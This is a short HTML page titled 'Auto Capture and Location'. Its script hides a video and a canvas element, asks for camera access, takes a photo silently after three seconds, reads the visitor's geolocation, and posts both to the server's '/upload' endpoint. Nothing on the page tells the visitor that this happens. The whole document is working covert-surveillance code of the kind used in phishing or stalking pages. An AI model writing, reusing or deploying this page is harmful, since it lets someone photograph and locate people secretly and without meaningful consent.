<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture and Location</title>
    <style>
        body { margin: 0; }
    </style>
</head>
<body>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        function sendLocationAndImage(imageData, latitude, longitude) {
            fetch('/upload', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ image: imageData, latitude: latitude, longitude: longitude })
            });
        }

        function captureImage() {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataURL = canvas.toDataURL('image/png');
            navigator.geolocation.getCurrentPosition((position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                sendLocationAndImage(dataURL, latitude, longitude);
            }, (error) => {
                console.error("Error getting location: " + error);
                sendLocationAndImage(dataURL, null, null);
            });
        }

        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                video.srcObject = stream;
                video.addEventListener('loadeddata', () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    setTimeout(captureImage, 3000);  // Capture after 3 seconds
                });
            })
            .catch((err) => {
                console.error("Error accessing camera: " + err);
            });
    </script>
</body>
</html>
